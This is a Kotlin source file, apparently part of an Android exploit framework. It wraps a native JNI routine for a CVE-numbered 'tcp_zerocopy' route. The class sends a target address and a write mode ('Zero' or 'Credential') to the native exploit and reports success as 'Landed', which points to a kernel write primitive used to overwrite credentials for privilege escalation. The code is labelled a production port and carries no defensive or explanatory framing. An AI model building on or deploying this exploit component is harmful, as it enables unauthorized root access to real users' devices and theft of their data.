package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.RouteResult
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.jni.cve43499.NativeTcpZerocopyJni

/** tcp_zerocopy production port; request target/value/mode are Kotlin-owned. */
class Cve43499TcpZerocopyPort(private val fake: LongArray = LongArray(0)) : Cve43499RoutePort {
    override val route: Cve43499RouteId = Cve43499RouteId.TcpZerocopy

    override fun attempt(request: WriteRequest, page: ByteArray, inputs: PayloadPageInputs, params: ByteArray): RouteResult {
        if (params.isNotEmpty()) return RouteResult.Refused("tcp-params-unexpected")
        val mode = when (request.mode) {
            WriteMode.Disabled -> 0
            WriteMode.Zero -> 1
            WriteMode.Credential -> 2
        }
        val result = NativeTcpZerocopyJni.run(request.target, mode, request.preserveChild, fake)
            ?: return RouteResult.Refused("tcp-jni-null")
        return if (result.ok) {
            RouteResult.Landed()
        } else {
            RouteResult.Refused("tcp:" + result.status + ":" + result.step + ":" + result.errno)
        }
    }

    override fun close() = Unit
}
